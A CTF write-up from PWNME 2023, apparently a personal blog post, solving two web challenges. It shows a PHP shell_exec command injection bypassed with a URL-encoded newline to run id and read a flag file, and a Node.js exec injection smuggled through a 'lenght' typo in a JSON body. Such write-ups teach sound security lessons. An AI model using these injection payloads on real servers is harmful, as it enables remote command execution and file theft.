---
title: CTF WRITEUP
date: 2023-05-12 02:04:40 +/-TTTT
categories: [ctf, learning]
tags: [ctf]     # TAG names should always be lowercase
---

# PWNME 8 BITS 2023
* Category Web

`treeview`

Here, you can check the content of any directories present on the server.

Find a way to abuse this functionality, and read the content of `/home/flag.txt`

# Enumeration
`HomePage`

In here, we can view the source code, and an input box, which allows us to check a directory.

Let’s look at the source code :

```php
<?php
$parsed = isset($_POST['input']) ? $_POST['input'] : "/home/";

preg_match_all('/[;|]/m', $parsed, $illegals, PREG_SET_ORDER, 0);
if($illegals){
    echo "Illegals chars found";
    $parsed = "/home/";
}

if(isset($_GET['source'])){
    highlight_file(__FILE__);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tree Viewer</title>
</head>
<body>
    <a href="/?source">Source code</a>
    <hr/>
    <form action="/" method="post">
        <label for="input">Directory to check</label>
    <input type="text" placeholder="Directory to see" id="input" name="input" value="<?= $parsed ?>">
    </form>

    <h3>Content of <?= $parsed ?>: <?= shell_exec('ls '.$parsed); ?></h3>
    
</body>
</html>
```

This is the challenge homepage.

What I noticed immediately is the <?= shell_exec('ls '.$parsed); ?> present in the source code.

If we can control the $parsed variable, we can execute commands.

Thanks to the source code provided, we can see that the input is passed into the preg_match_all function, filtering out the characters ; and |.

Let’s break it down!

When input POST parameter is provided, it’ll check the input contains ; OR | character via regular expression (regex). If no input parameter is provided or it contains ; OR |, default value will be /home/.

Finally, it’ll parse our input to a shell_exec() function, which will execute shell command!

Nice, we found a sink (Dangerous function)!

Let’s look at the shell_exec() function :

```php
<?= shell_exec('ls '.$parsed); ?>
```

This function will execute ls <path>!

That being said, although it has a regex filter, it’s still vulnerable to OS command injection!

# Exploitation

To bypass it, I’ll use the new line character `\n` (`%0a` in URL encoding)!

```
%0aid
```

Also, I’ll be using Burp Suite’s Repeater to send the `payload` :

```
Accept-Encoding: gzip, deflate
Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

input=%0aid
```

Boom! We have `Remote Code Execution` (RCE)!

Let’s read the flag!

payload : 

```
%0cat+/home/flag.txt
```
# Flag
```
PWNME{U53R_1NpU75_1n_5h3lL_3x3c_77}
```


`QRDoor Code`

A company needed a website, to generate QR Code. They asked for a freelance to do this job

Since the website is up, they've noticed weird behaviour on their server

They need you to audit their code and help them to resolve their problem

Flag is situed in `/app/flag.txt`

# Recon
The website’s sources are available for download here.

The application is developed in Node.js and runs an Express server.

It allows users to generate a QR Code from a value entered by the user.

For example, here we generated a QRCode with the value `PWNME2023`.

There is a mention at the top of the page indicating that the maximum size of the input is `150 characters`. Beyond that, a random sentence is generated for the QR Code.

The project contains two endpoints that are used:

`/` : which displays the homepage

`/generate` : which generates the QR Code

# Code analysis
`Home page endpoint`

```js
app.get('/', async (req, res) => {
    res.render('index');
});
```
The homepage is rendered by the EJS template engine.

There is nothing particular to note about this resource.

`Generation endpoint`

```js
app.post('/generate', async (req, res) => {
    const { value } = req.body;
    try {
        let newQrCode;
        // If the length is too long, we use a default according to the length
        if (value.length > 150)
            newQrCode = new QRCode(null, value.lenght)
        else {
            newQrCode = new QRCode(String(value))
        }
        
        const code = await newQrCode.getImage()
        res.json({ code, data: newQrCode.value });
    } catch (error) {
        res.status(422).json({ message: "error", reason: 'Unknow error' });
    }
});
```
This function is more interesting to analyze.

We see that the value input is retrieved from the request body, and if the length of the value is greater than 150 characters, then the value is not taken into account, only its length.

Finally, the `getImage()` function is called on the newQrCode object, and the result is returned to the client.

Let’s look at the sources of the QRCode class:

```javascript
class QRCode {
    constructor(value, defaultLength){
        this.value = value
        this.defaultLength = defaultLength
    }

    async getImage(){
        if(!this.value){
            // Use 'fortune' to generate a random funny line, based on the input size
            try {
                this.value = await execFortune(this.defaultLength)
            } catch (error) {
                this.value = 'Error while getting a funny line'
            }
        }
        return await qrcode.toDataURL(this.value).catch(err => 'error:(')
    }
}
```

To generate a QRCode, the `getImage()` function first checks that the value is not empty.

If there is a value, then the `execFortune()` function is called with the defaultLength value as a parameter.

```js
function execFortune(defaultLength) {
    return new Promise((resolve, reject) => {
     exec(`fortune -n ${defaultLength}`, (error, stdout, stderr) => {
      if (error) {
        reject(error);
      }
      resolve(stdout? stdout : stderr);
     });
    });
}
```

Here, we clearly identify a possible command injection by `manipulating the size of the value`.

One might think it’s impossible to exploit given that it’s an integer passed as a parameter to `execFortune`, but let’s take a closer look at how the size of the value is checked:

```js
if (value.length > 150)
    newQrCode = new QRCode(null, value.lenght)
else {
    newQrCode = new QRCode(String(value))
}
```
We notice a typo in the variable value.lenght, which should be value.length in the case where the value is greater than `150 characters`.

The initial request sent a `JSON` like this:

```js
{
    "value": "PWNME2023"
}
```

We can modify the request to take advantage of this typo by sending:

```js
{
    "value": {
        "length": 151,
        "lenght": "; cat /app/flag.txt"
    }
}
```